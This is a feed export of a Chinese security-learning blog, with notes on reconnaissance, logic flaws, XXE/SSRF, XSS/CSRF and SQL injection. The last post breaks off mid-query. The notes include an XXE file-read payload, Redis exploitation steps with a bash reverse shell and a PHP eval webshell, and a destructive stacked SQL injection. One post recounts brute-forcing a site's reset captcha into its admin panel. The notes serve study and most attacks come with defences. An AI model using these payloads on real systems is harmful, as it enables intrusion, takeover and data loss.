<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zhang&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wocao828.github.io/"/>
  <updated>2019-02-24T07:31:57.542Z</updated>
  <id>https://wocao828.github.io/</id>
  
  <author>
    <name>zhang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>信息泄露与信息收集</title>
    <link href="https://wocao828.github.io/2019/02/23/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://wocao828.github.io/2019/02/23/信息泄露与信息收集/</id>
    <published>2019-02-23T13:55:03.000Z</published>
    <updated>2019-02-24T07:31:57.542Z</updated>
    
    <content type="html"><![CDATA[<p>前言:信息泄露可造成重大危害，而信息收集则是渗透测试的首要流程</p><h2 id="信息泄露-web方向"><a href="#信息泄露-web方向" class="headerlink" title="信息泄露(web方向)"></a>信息泄露(web方向)</h2><p>1.web服务器信息(类型，版本)</p><p>2.web应用信息(web脚本类型，数据库类型，cms，内容)</p><p>3.服务器操作系统信息(类型，版本)</p><p>4.服务器其他服务信息(服务，端口)</p><p>5.域名信息(子域名，ip地址，注册相关信息)</p><p>6.相关人员信息(注册域名相关人员信息)</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="1-域名收集"><a href="#1-域名收集" class="headerlink" title="1.域名收集"></a>1.域名收集</h3><p>1.搜索引擎收集,google,baidu,bing,yahoo</p><p>查询网:<a href="http://site.ip138.com/" target="_blank" rel="noopener">http://site.ip138.com/</a></p><p>微步在线:<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></p><p>2.layer子域名挖掘机</p><p>3.主站爬取(vrossadmin.xml)</p><p>4.爬虫</p><p>5.解析记录收集(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p><p>6.https证书收集<br><img src="/2019/02/23/信息泄露与信息收集/1.png" alt="1"><br>7.常用工具收集(python2环境下)</p><p>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p><p>subDomainsBrute:<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>wydomain:<a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a></p><h3 id="2-相关注册人信息收集"><a href="#2-相关注册人信息收集" class="headerlink" title="2.相关注册人信息收集"></a>2.相关注册人信息收集</h3><p>1.站长之家</p><p>2.<a href="https://www.benmi.com" target="_blank" rel="noopener">https://www.benmi.com</a></p><p>3.<a href="http://whois.bugscaner.com/" target="_blank" rel="noopener">http://whois.bugscaner.com/</a></p><h3 id="3-web应用信息收集"><a href="#3-web应用信息收集" class="headerlink" title="3.web应用信息收集"></a>3.web应用信息收集</h3><p>1.web中间件信息</p><p>通过response包查看server头信息</p><p>nmap -A</p><p>返回的404页面</p><p>2.脚本语言</p><p>3.cms</p><p>查看底部版权信息<br><img src="/2019/02/23/信息泄露与信息收集/2.png" alt="2"><br>robots.txt</p><p>whatweb</p><h3 id="4-服务器信息收集"><a href="#4-服务器信息收集" class="headerlink" title="4.服务器信息收集"></a>4.服务器信息收集</h3><p>1.操作系统信息</p><p>大小写判断</p><p>2.开发端口</p><p>nmap -O</p><h3 id="5-其他信息收集"><a href="#5-其他信息收集" class="headerlink" title="5.其他信息收集"></a>5.其他信息收集</h3><p>github信息泄露(源代码，运维脚本，配置文件)</p><p>管理员blog信息泄露(源代码，运维信息，服务器信息)</p><h3 id="记一次网站的信息收集过程"><a href="#记一次网站的信息收集过程" class="headerlink" title="记一次网站的信息收集过程"></a>记一次网站的信息收集过程</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:信息泄露可造成重大危害，而信息收集则是渗透测试的首要流程&lt;/p&gt;
&lt;h2 id=&quot;信息泄露-web方向&quot;&gt;&lt;a href=&quot;#信息泄露-web方向&quot; class=&quot;headerlink&quot; title=&quot;信息泄露(web方向)&quot;&gt;&lt;/a&gt;信息泄露(web方向)&lt;/h2&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://wocao828.github.io/2019/02/23/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://wocao828.github.io/2019/02/23/逻辑漏洞/</id>
    <published>2019-02-23T13:22:32.000Z</published>
    <updated>2019-02-24T06:55:46.859Z</updated>
    
    <content type="html"><![CDATA[<p>前言:现在的常规漏洞已经越来越少了，而逻辑漏洞却越来越多了，本次来了解一些常见的逻辑漏洞</p><h3 id="一-身份认证安全"><a href="#一-身份认证安全" class="headerlink" title="一 身份认证安全"></a>一 身份认证安全</h3><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><h4 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h4><h4 id="针对cookie"><a href="#针对cookie" class="headerlink" title="针对cookie"></a>针对cookie</h4><h4 id="针对session"><a href="#针对session" class="headerlink" title="针对session"></a>针对session</h4><h4 id="加密测试"><a href="#加密测试" class="headerlink" title="加密测试"></a>加密测试</h4><h3 id="二-业务一致性安全"><a href="#二-业务一致性安全" class="headerlink" title="二 业务一致性安全"></a>二 业务一致性安全</h3><h4 id="1-邮箱更改"><a href="#1-邮箱更改" class="headerlink" title="1.邮箱更改"></a>1.邮箱更改</h4><h4 id="2-订单ID更改"><a href="#2-订单ID更改" class="headerlink" title="2.订单ID更改"></a>2.订单ID更改</h4><h4 id="3-商品编号更改"><a href="#3-商品编号更改" class="headerlink" title="3.商品编号更改"></a>3.商品编号更改</h4><h4 id="4-用户ID更改"><a href="#4-用户ID更改" class="headerlink" title="4.用户ID更改"></a>4.用户ID更改</h4><h4 id="5-手机号篡改"><a href="#5-手机号篡改" class="headerlink" title="5.手机号篡改"></a>5.手机号篡改</h4><h3 id="三-业务数据篡改"><a href="#三-业务数据篡改" class="headerlink" title="三 业务数据篡改"></a>三 业务数据篡改</h3><h4 id="1-金融数据篡改"><a href="#1-金融数据篡改" class="headerlink" title="1.金融数据篡改"></a>1.金融数据篡改</h4><h4 id="2-商品数量篡改"><a href="#2-商品数量篡改" class="headerlink" title="2.商品数量篡改"></a>2.商品数量篡改</h4><h4 id="3-本地js参数修改"><a href="#3-本地js参数修改" class="headerlink" title="3.本地js参数修改"></a>3.本地js参数修改</h4><h3 id="四-用户输入合规性"><a href="#四-用户输入合规性" class="headerlink" title="四 用户输入合规性"></a>四 用户输入合规性</h3><h4 id="1-注入"><a href="#1-注入" class="headerlink" title="1.注入"></a>1.注入</h4><h4 id="2-xss"><a href="#2-xss" class="headerlink" title="2.xss"></a>2.xss</h4><h4 id="3-csrf"><a href="#3-csrf" class="headerlink" title="3.csrf"></a>3.csrf</h4><h4 id="4-文件上传"><a href="#4-文件上传" class="headerlink" title="4.文件上传"></a>4.文件上传</h4><h4 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5.文件包含"></a>5.文件包含</h4><h4 id="6-xxe"><a href="#6-xxe" class="headerlink" title="6.xxe"></a>6.xxe</h4><h4 id="7-ssrf"><a href="#7-ssrf" class="headerlink" title="7.ssrf"></a>7.ssrf</h4><h3 id="五-密码找回逻辑漏洞"><a href="#五-密码找回逻辑漏洞" class="headerlink" title="五 密码找回逻辑漏洞"></a>五 密码找回逻辑漏洞</h3><h4 id="挖掘流程"><a href="#挖掘流程" class="headerlink" title="挖掘流程"></a>挖掘流程</h4><p>1.首先走一遍正常密码修改流程，把过程中的数据包全都保存</p><p>2.分析流程中哪些步骤使用了哪些身份认证信息，使用了哪些认证方法</p><p>3.分析那个步骤可以跳过，或者直接访问某个步骤</p><p>4.分析每个认证方法是否有缺陷，可否越权</p><p>5.尝试正常密码找回流程</p><p>6.分析找回机制所采用的验证手段，如验证码的有效期，有效次数等</p><p>7.抓取修改步骤中所有的数据包，尝试修改关键信息，如用户名等<br><img src="/2019/02/23/逻辑漏洞/1.png" alt="1"></p><h4 id="1-用户凭证暴力破解"><a href="#1-用户凭证暴力破解" class="headerlink" title="1.用户凭证暴力破解"></a>1.用户凭证暴力破解</h4><h4 id="2-直接返回凭证"><a href="#2-直接返回凭证" class="headerlink" title="2.直接返回凭证"></a>2.直接返回凭证</h4><h4 id="3-邮箱弱token"><a href="#3-邮箱弱token" class="headerlink" title="3.邮箱弱token"></a>3.邮箱弱token</h4><h4 id="4-用户凭证有效性"><a href="#4-用户凭证有效性" class="headerlink" title="4.用户凭证有效性"></a>4.用户凭证有效性</h4><h3 id="六-验证码突破"><a href="#六-验证码突破" class="headerlink" title="六 验证码突破"></a>六 验证码突破</h3><h4 id="1-前端验证"><a href="#1-前端验证" class="headerlink" title="1.前端验证"></a>1.前端验证</h4><h4 id="2-session存储验证码验证记录"><a href="#2-session存储验证码验证记录" class="headerlink" title="2.session存储验证码验证记录"></a>2.session存储验证码验证记录</h4><h4 id="3-验证码不变"><a href="#3-验证码不变" class="headerlink" title="3.验证码不变"></a>3.验证码不变</h4><h4 id="4-验证码自动识别"><a href="#4-验证码自动识别" class="headerlink" title="4.验证码自动识别"></a>4.验证码自动识别</h4><h3 id="七-业务授权安全"><a href="#七-业务授权安全" class="headerlink" title="七 业务授权安全"></a>七 业务授权安全</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h3 id="八-业务流程乱序"><a href="#八-业务流程乱序" class="headerlink" title="八 业务流程乱序"></a>八 业务流程乱序</h3><h3 id="九-业务接口调用"><a href="#九-业务接口调用" class="headerlink" title="九 业务接口调用"></a>九 业务接口调用</h3><h4 id="1-短信轰炸"><a href="#1-短信轰炸" class="headerlink" title="1.短信轰炸"></a>1.短信轰炸</h4><h4 id="2-内容编辑"><a href="#2-内容编辑" class="headerlink" title="2.内容编辑"></a>2.内容编辑</h4><h3 id="十-时效性绕过"><a href="#十-时效性绕过" class="headerlink" title="十 时效性绕过"></a>十 时效性绕过</h3><h4 id="1-时间刷新缺陷"><a href="#1-时间刷新缺陷" class="headerlink" title="1.时间刷新缺陷"></a>1.时间刷新缺陷</h4><h4 id="2-时间范围测试"><a href="#2-时间范围测试" class="headerlink" title="2.时间范围测试"></a>2.时间范围测试</h4><h3 id="十一-其他逻辑漏洞"><a href="#十一-其他逻辑漏洞" class="headerlink" title="十一 其他逻辑漏洞"></a>十一 其他逻辑漏洞</h3><h2 id="逻辑漏洞挖掘关键点图"><a href="#逻辑漏洞挖掘关键点图" class="headerlink" title="逻辑漏洞挖掘关键点图"></a>逻辑漏洞挖掘关键点图</h2><p><img src="/2019/02/23/逻辑漏洞/1.jpg" alt="1"></p><h3 id="关于网站xxx的验证码漏洞"><a href="#关于网站xxx的验证码漏洞" class="headerlink" title="关于网站xxx的验证码漏洞"></a>关于网站xxx的验证码漏洞</h3><p>1.打开登陆界面<br><img src="/2019/02/23/逻辑漏洞/2.png" alt="2"><br>2.发现找回密码功能<br><img src="/2019/02/23/逻辑漏洞/3.png" alt="3"><br>3.发送一次正常请求<br><img src="/2019/02/23/逻辑漏洞/4.png" alt="4"><br><img src="/2019/02/23/逻辑漏洞/5.png" alt="5"><br>4.更换账户，发现账户不存在<br><img src="/2019/02/23/逻辑漏洞/6.png" alt="6"><br>5.在网站首页发现账户<br><img src="/2019/02/23/逻辑漏洞/7.png" alt="7"><br>6.随机登陆密码错误<br><img src="/2019/02/23/逻辑漏洞/8.png" alt="8"><br>7.使用burp开始爆破验证码<br><img src="/2019/02/23/逻辑漏洞/9.png" alt="9"><br><img src="/2019/02/23/逻辑漏洞/10.png" alt="10"><br>8.设置足够的线程数<br><img src="/2019/02/23/逻辑漏洞/11.png" alt="11"><br>9.成功爆破出验证码<br><img src="/2019/02/23/逻辑漏洞/13.png" alt="13"><br>10.使用修改成功的密码登陆后台<br><img src="/2019/02/23/逻辑漏洞/14.png" alt="14"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:现在的常规漏洞已经越来越少了，而逻辑漏洞却越来越多了，本次来了解一些常见的逻辑漏洞&lt;/p&gt;
&lt;h3 id=&quot;一-身份认证安全&quot;&gt;&lt;a href=&quot;#一-身份认证安全&quot; class=&quot;headerlink&quot; title=&quot;一 身份认证安全&quot;&gt;&lt;/a&gt;一 身份认证安全&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>xxe和ssrf</title>
    <link href="https://wocao828.github.io/2019/02/23/xxe%E5%92%8Cssrf/"/>
    <id>https://wocao828.github.io/2019/02/23/xxe和ssrf/</id>
    <published>2019-02-23T08:18:45.000Z</published>
    <updated>2019-02-23T13:14:36.687Z</updated>
    
    <content type="html"><![CDATA[<p>前言:xxe和ssrf是比较严重的漏洞，本次初步了解这两个漏洞</p><h2 id="xxe-xml外部实体注入"><a href="#xxe-xml外部实体注入" class="headerlink" title="xxe(xml外部实体注入)"></a>xxe(xml外部实体注入)</h2><h3 id="xml-可扩展标识语言"><a href="#xml-可扩展标识语言" class="headerlink" title="xml(可扩展标识语言)"></a>xml(可扩展标识语言)</h3><h4 id="xml文档结构"><a href="#xml文档结构" class="headerlink" title="xml文档结构"></a>xml文档结构</h4><h5 id="1-xml声明"><a href="#1-xml声明" class="headerlink" title="1.xml声明"></a>1.xml声明</h5><h5 id="2-dtd文档类型定义"><a href="#2-dtd文档类型定义" class="headerlink" title="2.dtd文档类型定义"></a>2.dtd文档类型定义</h5><h5 id="3-文档元素"><a href="#3-文档元素" class="headerlink" title="3.文档元素"></a>3.文档元素</h5><h4 id="xml实体-ENTITY-xml语言的变量"><a href="#xml实体-ENTITY-xml语言的变量" class="headerlink" title="xml实体(ENTITY):xml语言的变量"></a>xml实体(ENTITY):xml语言的变量</h4><h5 id="分类-普通实体和参数实体"><a href="#分类-普通实体和参数实体" class="headerlink" title="分类:普通实体和参数实体"></a>分类:普通实体和参数实体</h5><h4 id="dtd-文档类型定义"><a href="#dtd-文档类型定义" class="headerlink" title="dtd(文档类型定义)"></a>dtd(文档类型定义)</h4><p>1.内部DTD文档</p><p>&lt;!DOCTYPE 根元素[定义内容]&gt;</p><p>2.外部DTD文档</p><p>&lt;!DOCTYPE 根元素 SYSTEM “DTD文件路径”&gt;</p><p>3.内外部DTD文档结合</p><p>&lt;!DOCTYPE 根元素 SYSTEM “DTD文件路径” [定义内容]&gt;</p><h3 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h3><h4 id="原理-参数实体引入外部实体"><a href="#原理-参数实体引入外部实体" class="headerlink" title="原理(参数实体引入外部实体)"></a>原理(参数实体引入外部实体)</h4><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>1.XML是否会被成功解析<br>2.服务器是否支持DTD引用外部实体</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</p><p>&lt;!DOCTYPE %test[</p><pre><code>&lt;!ENTITY % a SYSTEM &quot;http://www.test.com/outdtd.dtd&quot;&gt;% a;]&gt;</code></pre><test>&xxe;</test><p>outdtd.dtd</p><p>&lt;!ENTITY xxe SYSTEM “file///etc/passwd”&gt;</p><h4 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h4><p>libxml2:file,http,ftp</p><p>php:file,http,ftp,php,data,glob,phar</p><p>java:file,http,ftp,https,jar,netdoc,mailto,gopher</p><p>.net:file,http,ftp,https</p><h3 id="xxe危害"><a href="#xxe危害" class="headerlink" title="xxe危害"></a>xxe危害</h3><h4 id="1-读取任意文件"><a href="#1-读取任意文件" class="headerlink" title="1.读取任意文件"></a>1.读取任意文件</h4><p><img src="/2019/02/23/xxe和ssrf/1.png" alt="1"></p><h4 id="2-url请求"><a href="#2-url请求" class="headerlink" title="2.url请求"></a>2.url请求</h4><p><img src="/2019/02/23/xxe和ssrf/2.png" alt="2"><br><img src="/2019/02/23/xxe和ssrf/2-1.png" alt="3"></p><h4 id="3-dos拒绝服务"><a href="#3-dos拒绝服务" class="headerlink" title="3.dos拒绝服务"></a>3.dos拒绝服务</h4><p><img src="/2019/02/23/xxe和ssrf/3.png" alt="3"></p><h3 id="xxe漏洞修复与防御"><a href="#xxe漏洞修复与防御" class="headerlink" title="xxe漏洞修复与防御"></a>xxe漏洞修复与防御</h3><h4 id="1-使用开发语言提供的禁用外部实体的方法"><a href="#1-使用开发语言提供的禁用外部实体的方法" class="headerlink" title="1.使用开发语言提供的禁用外部实体的方法"></a>1.使用开发语言提供的禁用外部实体的方法</h4><p>php:libxml_disable_entity_loader(true);</p><p>java:</p><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</p><p>dbf.setExpandEntityReferences(false);</p><p>python:</p><p>from lxml import etree</p><p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><h4 id="2-过滤关键词"><a href="#2-过滤关键词" class="headerlink" title="2.过滤关键词"></a>2.过滤关键词</h4><p>过滤&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p><h2 id="ssrf-服务端跨站请求伪造"><a href="#ssrf-服务端跨站请求伪造" class="headerlink" title="ssrf(服务端跨站请求伪造)"></a>ssrf(服务端跨站请求伪造)</h2><h3 id="ssrf原理"><a href="#ssrf原理" class="headerlink" title="ssrf原理"></a>ssrf原理</h3><p>攻击者从网站A(连接内外网且存在ssrf漏洞)直接访问网站B(无法从外网直接访问)</p><h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制</p><h3 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h3><p>1.通过URL地址分享网页内容<br>2.通过URL地址加载或下载图片</p><h3 id="攻击应用"><a href="#攻击应用" class="headerlink" title="攻击应用"></a>攻击应用</h3><p>ssrf作为跳板可攻击内网多种应用如redis,discuz,fastcgi,memcache,webdav,struts,jboss,axis2等应用</p><h4 id="redis未授权访问-6379端口开放"><a href="#redis未授权访问-6379端口开放" class="headerlink" title="redis未授权访问(6379端口开放)"></a>redis未授权访问(6379端口开放)</h4><p>redis-cli -h 192.168.xxx.xxx</p><p>info</p><h5 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h5><p>1.config set dir /root/.ssh</p><p>2.config set dbfilename authorized_keys</p><p>3.set 1 “\n\n\n公钥\n\n\n”</p><p>4.save</p><h5 id="在crontab里写定时任务，反弹shell"><a href="#在crontab里写定时任务，反弹shell" class="headerlink" title="在crontab里写定时任务，反弹shell"></a>在crontab里写定时任务，反弹shell</h5><p>1.config set dir /var/spool/cron</p><p>2.config set dbfilename root</p><p>3.set xxx “\n\n<em>/1 </em> <em> </em> * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n”</p><p>4.save</p><h5 id="在web目录下写入webshell"><a href="#在web目录下写入webshell" class="headerlink" title="在web目录下写入webshell"></a>在web目录下写入webshell</h5><p>1.config set dir /var/www/html</p><p>2.config set dbfilename webshell.php</p><p>3.set xxx “\n\n\n&lt;?php @eval($_POST[‘c’]);?&gt;\n\n\n”</p><p>4.save</p><h4 id="redis未授权访问在windows下的利用-详见https-www-anquanke-com-post-id-170360"><a href="#redis未授权访问在windows下的利用-详见https-www-anquanke-com-post-id-170360" class="headerlink" title="redis未授权访问在windows下的利用(详见https://www.anquanke.com/post/id/170360)"></a>redis未授权访问在windows下的利用(详见<a href="https://www.anquanke.com/post/id/170360" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360</a>)</h4><h5 id="1-能够获取web绝对路径的，直接写入webshell"><a href="#1-能够获取web绝对路径的，直接写入webshell" class="headerlink" title="1.能够获取web绝对路径的，直接写入webshell"></a>1.能够获取web绝对路径的，直接写入webshell</h5><h5 id="2-写入启动项"><a href="#2-写入启动项" class="headerlink" title="2.写入启动项"></a>2.写入启动项</h5><h5 id="3-写入mof、dll劫持等"><a href="#3-写入mof、dll劫持等" class="headerlink" title="3.写入mof、dll劫持等"></a>3.写入mof、dll劫持等</h5><h4 id="redis未授权访问防御"><a href="#redis未授权访问防御" class="headerlink" title="redis未授权访问防御"></a>redis未授权访问防御</h4><p>1.修改 redis.conf 文件，禁用远程修改 DB 文件地址</p><p>2.以低权限运行 Redis 服务</p><p>3.为 Redis 添加密码验证</p><p>4.禁止外网访问 Redis</p><p>5.修改默认端口</p><p>6.保证 authorized_keys 文件的安全</p><p>7.设置防火墙策略</p><h3 id="ssrf防御"><a href="#ssrf防御" class="headerlink" title="ssrf防御"></a>ssrf防御</h3><p>1.过滤返回信息</p><p>2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态</p><p>3.限制请求的端口为http常用的端口，比如:80,443,8080</p><p>4.黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网</p><p>5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:xxe和ssrf是比较严重的漏洞，本次初步了解这两个漏洞&lt;/p&gt;
&lt;h2 id=&quot;xxe-xml外部实体注入&quot;&gt;&lt;a href=&quot;#xxe-xml外部实体注入&quot; class=&quot;headerlink&quot; title=&quot;xxe(xml外部实体注入)&quot;&gt;&lt;/a&gt;xxe(xml
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>xss与csrf</title>
    <link href="https://wocao828.github.io/2019/02/17/xss%E4%B8%8Ecsrf/"/>
    <id>https://wocao828.github.io/2019/02/17/xss与csrf/</id>
    <published>2019-02-17T09:30:53.000Z</published>
    <updated>2019-02-17T12:19:11.565Z</updated>
    
    <content type="html"><![CDATA[<p>前言:xss与csrf主要是对用户产生危害，本次对它们进行初步学习</p><h2 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss(跨站脚本攻击)"></a>xss(跨站脚本攻击)</h2><h4 id="xss产生两个条件"><a href="#xss产生两个条件" class="headerlink" title="xss产生两个条件"></a>xss产生两个条件</h4><h5 id="1-可以控制的输入点"><a href="#1-可以控制的输入点" class="headerlink" title="1.可以控制的输入点"></a>1.可以控制的输入点</h5><h5 id="2-输入能返回到前端页面被浏览器当成脚本语言执行"><a href="#2-输入能返回到前端页面被浏览器当成脚本语言执行" class="headerlink" title="2.输入能返回到前端页面被浏览器当成脚本语言执行"></a>2.输入能返回到前端页面被浏览器当成脚本语言执行</h5><h4 id="xss危害"><a href="#xss危害" class="headerlink" title="xss危害"></a>xss危害</h4><p>cookie劫持</p><p>会话劫持</p><p>键盘记录</p><p>客户端信息探查</p><p>网页挂马</p><p>xss蠕虫</p><h4 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h4><h5 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h5><h5 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h5><h5 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h5><h3 id="xss平台搭建"><a href="#xss平台搭建" class="headerlink" title="xss平台搭建"></a>xss平台搭建</h3><h4 id="beef搭建"><a href="#beef搭建" class="headerlink" title="beef搭建"></a>beef搭建</h4><h4 id="blue-lotus搭建"><a href="#blue-lotus搭建" class="headerlink" title="blue-lotus搭建"></a>blue-lotus搭建</h4><h3 id="xss过滤"><a href="#xss过滤" class="headerlink" title="xss过滤"></a>xss过滤</h3><h4 id="1-标签引号内过滤"><a href="#1-标签引号内过滤" class="headerlink" title="1.标签引号内过滤"></a>1.标签引号内过滤</h4><h4 id="2-尖括号内过滤"><a href="#2-尖括号内过滤" class="headerlink" title="2.尖括号内过滤"></a>2.尖括号内过滤</h4><h4 id="3-全局过滤"><a href="#3-全局过滤" class="headerlink" title="3.全局过滤"></a>3.全局过滤</h4><p>1.弹框函数alert(),prompt(),confirm()</p><p>2.on事件</p><p>3.JavaScript伪协议</p><p>4.data协议 data://text/plain;base64,xxx</p><p>5.外部js</p><h4 id="xss测试"><a href="#xss测试" class="headerlink" title="xss测试"></a>xss测试</h4><p>在测试时，先单独发送一个&lt; 或 ‘ 或 “</p><p>看一下网页源代码，有没有进行html实体编码</p><p>如果没有，变形绕过</p><p>如果有，无法绕过</p><h4 id="xss变形"><a href="#xss变形" class="headerlink" title="xss变形"></a>xss变形</h4><p>1.大小写混合写</p><p>2.改变标签</p><p>3.加入空格</p><p>4.加入特殊字</p><p>5.使用其他属性</p><p>6.利用事件绕过</p><p>7.利用编码绕过</p><h3 id="xss修复与防御"><a href="#xss修复与防御" class="headerlink" title="xss修复与防御"></a>xss修复与防御</h3><p>html实体化编码eq:htmlspecialchars()</p><p>http-only</p><h2 id="csrf-跨站伪造请求"><a href="#csrf-跨站伪造请求" class="headerlink" title="csrf(跨站伪造请求)"></a>csrf(跨站伪造请求)</h2><h4 id="csrf危害"><a href="#csrf危害" class="headerlink" title="csrf危害"></a>csrf危害</h4><h5 id="1-作为其他攻击的辅助手法"><a href="#1-作为其他攻击的辅助手法" class="headerlink" title="1.作为其他攻击的辅助手法"></a>1.作为其他攻击的辅助手法</h5><h5 id="2-传播蠕虫"><a href="#2-传播蠕虫" class="headerlink" title="2.传播蠕虫"></a>2.传播蠕虫</h5><h5 id="3-伪造http请求未授权操作"><a href="#3-伪造http请求未授权操作" class="headerlink" title="3.伪造http请求未授权操作"></a>3.伪造http请求未授权操作</h5><h4 id="csrf防御"><a href="#csrf防御" class="headerlink" title="csrf防御"></a>csrf防御</h4><h5 id="1-token验证"><a href="#1-token验证" class="headerlink" title="1.token验证"></a>1.token验证</h5><h5 id="2-referer验证"><a href="#2-referer验证" class="headerlink" title="2.referer验证"></a>2.referer验证</h5><h5 id="3-验证码验证"><a href="#3-验证码验证" class="headerlink" title="3.验证码验证"></a>3.验证码验证</h5>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:xss与csrf主要是对用户产生危害，本次对它们进行初步学习&lt;/p&gt;
&lt;h2 id=&quot;xss-跨站脚本攻击&quot;&gt;&lt;a href=&quot;#xss-跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;xss(跨站脚本攻击)&quot;&gt;&lt;/a&gt;xss(跨站脚本攻击)&lt;/h
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>总结注入上传包含和命令执行</title>
    <link href="https://wocao828.github.io/2019/01/20/%E6%80%BB%E7%BB%93%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0%E5%8C%85%E5%90%AB%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://wocao828.github.io/2019/01/20/总结注入上传包含和命令执行/</id>
    <published>2019-01-20T11:08:18.000Z</published>
    <updated>2019-01-20T11:31:41.726Z</updated>
    
    <content type="html"><![CDATA[<p>前言:经过前一阵子的学习，对前面部分的漏洞进行小的总结</p><h2 id="web漏洞"><a href="#web漏洞" class="headerlink" title="web漏洞"></a>web漏洞</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>数字型和字符型</p><h4 id="根据利用手法不同"><a href="#根据利用手法不同" class="headerlink" title="根据利用手法不同"></a>根据利用手法不同</h4><h5 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h5><h5 id="报错注入-输出报错信息"><a href="#报错注入-输出报错信息" class="headerlink" title="报错注入// 输出报错信息"></a>报错注入// 输出报错信息</h5><h5 id="union联合查询注入"><a href="#union联合查询注入" class="headerlink" title="union联合查询注入"></a>union联合查询注入</h5><p>页面有’显示位’</p><p>显示位  ==&gt;  查询的结果，会显示在页面中</p><h5 id="基于时间延时的盲注"><a href="#基于时间延时的盲注" class="headerlink" title="基于时间延时的盲注"></a>基于时间延时的盲注</h5><h5 id="内连注入"><a href="#内连注入" class="headerlink" title="内连注入"></a>内连注入</h5><p>select * from user where id = ‘1 ‘ bool盲注 and/or ‘a’=’a’ limit 0.1</p><h5 id="多语句注入-堆叠注入-mssql特有的"><a href="#多语句注入-堆叠注入-mssql特有的" class="headerlink" title="多语句注入/堆叠注入(mssql特有的)"></a>多语句注入/堆叠注入(mssql特有的)</h5><p>select * from user where id = ‘1 ‘;delete from user; #’ limit 0,1</p><h4 id="根据sql语句不同"><a href="#根据sql语句不同" class="headerlink" title="根据sql语句不同"></a>根据sql语句不同</h4><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><h5 id="update"><a href="#update" class="headerlink" title="update"></a>update</h5><h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><h5 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h5><p>遇到update,delete,insert 推荐使用dnslog</p><p>linux系统不能用，windows+mysql 不一定可用，mssql结合exec可用，acess不可用</p><h4 id="根据数据库不同"><a href="#根据数据库不同" class="headerlink" title="根据数据库不同"></a>根据数据库不同</h4><h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><h5 id="aceess"><a href="#aceess" class="headerlink" title="aceess"></a>aceess</h5><p>一般情况下需要判断access还是mssql数据库</p><p>and exits(select count(*) from 